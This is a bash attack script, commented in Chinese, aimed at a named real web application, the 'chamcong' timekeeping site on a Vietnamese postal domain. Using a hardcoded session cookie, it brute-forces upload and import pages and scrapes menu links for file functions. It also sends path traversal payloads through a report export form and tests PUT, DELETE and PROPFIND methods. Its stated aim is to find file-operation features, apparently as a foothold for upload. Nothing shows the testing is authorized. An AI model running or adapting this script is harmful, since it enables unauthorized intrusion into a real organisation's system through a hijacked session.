#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 终极目标：寻找文件操作功能"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

mkdir -p ultimate_hunt && cd ultimate_hunt

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[阶段1] 暴力枚举所有可能的文件操作页面"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 生成超大字典（所有可能的文件操作相关页面）
cat > mega_file_operation_wordlist.txt << 'WORDLIST'
Upload.aspx
upload.aspx
FileUpload.aspx
fileupload.aspx
Import.aspx
import.aspx
ImportData.aspx
ImportFile.aspx
ImportExcel.aspx
UploadFile.aspx
UploadExcel.aspx
UploadDocument.aspx
Attach.aspx
Attachment.aspx
Report/Upload.aspx
Report/Import.aspx
Admin/Upload.aspx
Admin/Import.aspx
Admin/FileUpload.aspx
NhanSu/Upload.aspx
NhanSu/Import.aspx
Data/Import.aspx
Data/Upload.aspx
Tools/Upload.aspx
Tools/Import.aspx
Utility/Upload.aspx
Backup/Import.aspx
Backup/Upload.aspx
TaoMoi.aspx
TaoBCC.aspx
SuaBCC.aspx
ThemBCC.aspx
NhapLieu.aspx
NhapDuLieu.aspx
ImportBC.aspx
UploadBC.aspx
TaiLen.aspx
NhapFile.aspx
ChonFile.aspx
Manager/Upload.aspx
Config/Upload.aspx
Setting/Upload.aspx
System/Upload.aspx
Common/Upload.aspx
Common/Import.aspx
WORDLIST

echo "  生成字典: $(wc -l < mega_file_operation_wordlist.txt) 个页面"
echo ""
echo "  开始暴力枚举..."

while read page; do
    resp=$(curl -sk "${BASE}/${page}" \
        -H "Cookie: $COOKIE" \
        -w "%{http_code}" \
        -o "enum_$(echo $page | tr '/' '_').html" 2>&1)
    
    http_code=$(echo "$resp" | tail -c 4)
    size=$(wc -c < "enum_$(echo $page | tr '/' '_').html" 2>/dev/null || echo 0)
    
    if [ "$http_code" == "200" ] && [ $size -gt 2000 ]; then
        echo "  ✅ $page: $http_code ($size bytes)"
        
        # 检查是否有文件上传表单
        if grep -qi "file\|upload\|input.*type.*file\|enctype.*multipart" "enum_$(echo $page | tr '/' '_').html"; then
            echo "     🔥🔥🔥 包含文件上传表单！"
            grep -i "file\|upload" "enum_$(echo $page | tr '/' '_').html" | head -5
        fi
        
        # 记录成功的页面
        echo "$page|$http_code|$size" >> found_pages.txt
        
    elif [ "$http_code" == "302" ] || [ "$http_code" == "301" ]; then
        echo "  ↗️  $page: $http_code (重定向)"
    fi
done < mega_file_operation_wordlist.txt

echo ""
echo "  发现页面: $(wc -l < found_pages.txt 2>/dev/null || echo 0) 个"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[阶段2] 深度分析已知页面的隐藏功能"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 获取leftmenu完整HTML
echo "  获取完整菜单..."
curl -sk "${BASE}/leftmenu.aspx" -H "Cookie: $COOKIE" > leftmenu_full.html 2>&1

# 提取所有onclick和href
echo "  提取所有交互元素..."
grep -hoE "(href|onclick)=['\"]([^'\"]+)" leftmenu_full.html | \
    sed 's/.*=["'\'']//' | sort -u > all_interactions.txt

echo "  发现交互: $(wc -l < all_interactions.txt)"

# 查找可能的文件操作关键词
echo ""
echo "  搜索文件操作关键词..."
grep -iE "upload|import|file|attach|excel|csv|tao|nhap|tai.*len|chon" all_interactions.txt

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[阶段3] 测试所有报表ID寻找导入功能"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 扩展报表ID范围
REPORT_IDS=(
    "MAU1" "MAU2" "MAU3" "MAU4" "MAU5" "MAU6" "MAU7" "MAU8" "MAU9" "MAU10"
    "BC01" "BC02" "BC03" "BC04" "BC05"
    "BCC01" "BCC02" "BCC03"
    "IMPORT" "UPLOAD" "NHAP" "TAO"
)

echo "  测试 ${#REPORT_IDS[@]} 个报表ID..."

for id in "${REPORT_IDS[@]}"; do
    # 访问报表页面
    page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" -H "Cookie: $COOKIE" 2>&1)
    size=$(echo "$page" | wc -c)
    
    # 检查是否有导入/上传按钮
    if echo "$page" | grep -qiE "import|upload|nhap|tai.*len|chon.*file"; then
        echo "  🔥 ID=$id: 可能有导入功能 ($size bytes)"
        
        # 提取按钮名称
        echo "$page" | grep -oE "id=['\"]btn[^'\"]+['\"]" | cut -d'"' -f2 | while read btn; do
            echo "     按钮: $btn"
        done
        
        echo "$page" > "report_${id}_full.html"
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[阶段4] 尝试通过现有功能创建目录"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  策略：利用路径遍历创建父目录"
echo ""

# 获取ViewState
page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" -H "Cookie: $COOKIE" 2>&1)
VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)

# 尝试1：创建TEMP目录
echo "  尝试1: 路径 = 'TEMP/test'"
curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=TEMP/test" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnExport=Export" \
    -o create_temp_test1.html 2>&1

result1=$(grep -o "Could not find.*" create_temp_test1.html | head -1)
echo "    结果: $result1"

# 尝试2：多级目录
echo ""
echo "  尝试2: 路径 = 'C:/TEMP/test'"
curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=C:/TEMP/test" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnExport=Export" \
    -o create_temp_test2.html 2>&1

result2=$(grep -o "Could not find.*" create_temp_test2.html | head -1)
echo "    结果: $result2"

# 尝试3：相对路径从根
echo ""
echo "  尝试3: 路径 = '../TEMP/test' (从chamcong向上)"
curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=../TEMP/test" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnExport=Export" \
    -o create_temp_test3.html 2>&1

result3=$(grep -o "Could not find.*" create_temp_test3.html | head -1)
echo "    结果: $result3"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[阶段5] HTTP方法篡改寻找隐藏功能"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

METHODS=("PUT" "DELETE" "OPTIONS" "TRACE" "PROPFIND")

for method in "${METHODS[@]}"; do
    echo ""
    echo "  测试 $method 方法..."
    
    resp=$(curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X $method \
        -H "Cookie: $COOKIE" \
        -w "%{http_code}" 2>&1)
    
    http_code=$(echo "$resp" | tail -c 4)
    size=$(echo "$resp" | wc -c)
    
    echo "    状态: $http_code, 大小: $size bytes"
    
    if [ "$http_code" != "404" ] && [ "$http_code" != "405" ]; then
        echo "    🔥 可能支持 $method 方法！"
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 阶段1-5完成，继续深度搜索..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
